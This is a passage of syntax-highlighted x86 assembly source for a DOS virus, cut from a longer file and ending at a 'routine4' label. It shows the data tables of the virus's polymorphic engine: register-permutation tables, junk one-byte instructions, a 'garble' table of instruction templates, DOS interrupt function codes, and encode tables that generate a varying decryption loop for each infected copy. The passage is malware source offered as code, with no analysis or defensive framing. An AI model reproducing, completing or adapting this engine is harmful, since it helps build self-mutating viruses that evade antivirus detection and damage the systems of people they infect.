</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">write_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">write_nothing</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">write_cryptval</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">write_pointer_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">write_counter_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">write_ptr_offset</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">write_dl</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">; In the following table, each pair of bits represents a register</span><span class="sc0">
</span><span class="sc1">; in standard Intel format, i.e. 00 = ax, 01 = cx, 10 = dx, 11 = bx</span><span class="sc0">
</span><span class="sc5">use_regs_tbl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00011011b</span><span class="sc0"> </span><span class="sc1">; ax cx dx bx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11000110b</span><span class="sc0"> </span><span class="sc1">; bx ax cx dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10110001b</span><span class="sc0"> </span><span class="sc1">; dx bx ax cx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">01101100b</span><span class="sc0"> </span><span class="sc1">; cx dx bx ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11100100b</span><span class="sc0"> </span><span class="sc1">; bx dx cx ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00111001b</span><span class="sc0"> </span><span class="sc1">; ax bx dx cx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">01001110b</span><span class="sc0"> </span><span class="sc1">; cx ax bx dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10010011b</span><span class="sc0"> </span><span class="sc1">; dx cx ax bx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">01001011b</span><span class="sc0"> </span><span class="sc1">; cx ax dx bx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11010010b</span><span class="sc0"> </span><span class="sc1">; bx cx ax dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10110100b</span><span class="sc0"> </span><span class="sc1">; dx bx cx ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00101101b</span><span class="sc0"> </span><span class="sc1">; ax dx cx bx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11100001b</span><span class="sc0"> </span><span class="sc1">; bx dx ax cx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">01111000b</span><span class="sc0"> </span><span class="sc1">; cx bx dx ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00011110b</span><span class="sc0"> </span><span class="sc1">; ax cx bx dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10000111b</span><span class="sc0"> </span><span class="sc1">; dx ax cx bx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00100111b</span><span class="sc0"> </span><span class="sc1">; ax dx cx bx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11001001b</span><span class="sc0"> </span><span class="sc1">; bx ax dx cx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">01110010b</span><span class="sc0"> </span><span class="sc1">; cx bx ax dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10011100b</span><span class="sc0"> </span><span class="sc1">; dx cx bx ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11011000b</span><span class="sc0"> </span><span class="sc1">; dx ax bx cx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00110110b</span><span class="sc0"> </span><span class="sc1">; ax bx cx dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10001101b</span><span class="sc0"> </span><span class="sc1">; bx cx dx ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">01100011b</span><span class="sc0"> </span><span class="sc1">; cx dx ax bx</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">onebyte_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">; high byte holds the opcode, low byte holds the second byte of the</span><span class="sc0">
</span><span class="sc1">; instruction, i.e. holds the reg/mod, etc. the bottom 2 bits of the low</span><span class="sc0">
</span><span class="sc1">; byte hold the maximum amount to add to the high byte in creating the</span><span class="sc0">
</span><span class="sc1">; instruction. This allows one word to generate more than one instruction,</span><span class="sc0">
</span><span class="sc1">; including the byte or word forms of the instructions</span><span class="sc0">
</span><span class="sc1">; note that this is reverse of what will be actually stored</span><span class="sc0">
</span><span class="sc5">garble_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">80F1h</span><span class="sc0">   </span><span class="sc1">;  XOR reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">3201h</span><span class="sc0">   </span><span class="sc1">;  XOR reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F6C1h</span><span class="sc0">   </span><span class="sc1">; TEST reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">8405h</span><span class="sc0">   </span><span class="sc1">; TEST/XCHG reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">80E9h</span><span class="sc0">   </span><span class="sc1">;  SUB reg, XXXX        (2 diff encodings)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">2A01h</span><span class="sc0">   </span><span class="sc1">;  SUB reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D0EBh</span><span class="sc0">   </span><span class="sc1">;  SHR reg, 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">1A01h</span><span class="sc0">   </span><span class="sc1">;  SBB reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">80D9h</span><span class="sc0">   </span><span class="sc1">;  SBB reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">80D1h</span><span class="sc0">   </span><span class="sc1">;  ADC reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D0FBh</span><span class="sc0">   </span><span class="sc1">;  SAR reg, 1/CL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D0E3h</span><span class="sc0">   </span><span class="sc1">;  SHL reg, 1/CL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D0CBh</span><span class="sc0">   </span><span class="sc1">;  ROR reg, 1/CL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D0C3h</span><span class="sc0">   </span><span class="sc1">;  ROL reg, 1/CL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">8405h</span><span class="sc0">   </span><span class="sc1">; TEST/XCHG reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D0DBh</span><span class="sc0">   </span><span class="sc1">;  RCR reg, 1/CL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0C6C1h</span><span class="sc0">   </span><span class="sc1">;  MOV reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">080C9h</span><span class="sc0">   </span><span class="sc1">;   OR reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0A01h</span><span class="sc0">   </span><span class="sc1">;   OR reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F6D1h</span><span class="sc0">   </span><span class="sc1">;  NOT reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F6D9h</span><span class="sc0">   </span><span class="sc1">;  NEG reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">8A01h</span><span class="sc0">   </span><span class="sc1">;  MOV reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0C6C1h</span><span class="sc0">   </span><span class="sc1">;  MOV reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">0201h</span><span class="sc0">   </span><span class="sc1">;  ADD reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">80C1h</span><span class="sc0">   </span><span class="sc1">;  ADD reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">80FDh</span><span class="sc0">   </span><span class="sc1">;  CMP reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">3807h</span><span class="sc0">   </span><span class="sc1">;  CMP reg, [reg]       (2 diff encodings)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">80E1h</span><span class="sc0">   </span><span class="sc1">;  AND reg, XXXX</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D0D3h</span><span class="sc0">   </span><span class="sc1">;  RCL reg, 1/CL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">2201h</span><span class="sc0">   </span><span class="sc1">;  AND reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">1201h</span><span class="sc0">   </span><span class="sc1">;  ADC reg, [reg]</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">8A01h</span><span class="sc0">   </span><span class="sc1">;  MOV reg, [reg]</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">number_of_fnc21</span><span class="sc4">=</span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">int21fcns</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc1">;0Dh,2Eh,3Dh,41h,4Dh,54h,62h</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">counter_init_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit0</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit2</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit3</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit4</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit5</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit6</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counterinit7</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">encode_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">use_as_is</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fill_mod_field</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fill_field</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fill_reg_reg1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fill_reg_field</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fill_mod_n_reg</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">fill_reg_reg2</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">encode_tbl1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">8Ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 1 MOV reg0, CS</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">8Eh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 2 MOV DS, reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">7h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; 3 MOV reg7,initial pointer</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; 4 MOV reg1,initial counter</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; 5 MOV reg2,[reg7+offset]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; 6 MOV [reg7+offset],reg2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; 7 XOR reg2,cryptvalue</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; 8 MOV reg2,reg1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; 9 XOR [reg7],reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">; A NEG [reg7+offset]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">; B NOT [reg7+offset]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; C INC reg7</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; D DEC reg1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; E MOV reg0,cryptval</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; F XOR reg2,reg0</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">encode_tbl2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; 1 XCHG reg0,[reg7+offset]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; 2 INC reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; 3 DEC reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">7h</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">      </span><span class="sc1">; 4 ADD reg7,1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">       </span><span class="sc1">; 5 SUB reg1,1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; 6 ADD reg2,reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 7 SUB reg2,reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">; 8 PUSH [reg7+offset]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">8Fh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; 9 POP  [reg7+offset]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; A PUSH reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; B POP reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; C XCHG reg2,reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; D INC reg2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; E MOV reg1,reg0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; F AND reg1,reg1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine4</span><span class="sc4">:</span><span class="sc0">
